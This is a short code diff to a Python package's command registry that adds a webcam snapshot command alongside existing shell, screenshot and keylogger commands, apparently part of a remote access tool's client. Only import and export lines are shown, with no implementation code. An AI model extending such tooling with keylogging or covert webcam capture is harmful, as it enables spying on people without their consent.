@@ -3,5 +3,6 @@ from client.commands.ipconfig import IpconfigCommand
 from client.commands.shell import ShellCommand
 from client.commands.screenshot import ScreenshotCommand
 from client.commands.keylogger import KeyloggerCommand
+from client.commands.webcam import WebcamSnapshotCommand
 
-__all__ = ["HelpCommand", "IpconfigCommand", "ShellCommand", "ScreenshotCommand", "KeyloggerCommand"]
+__all__ = ["HelpCommand", "IpconfigCommand", "ShellCommand", "ScreenshotCommand", "KeyloggerCommand", "WebcamSnapshotCommand"]
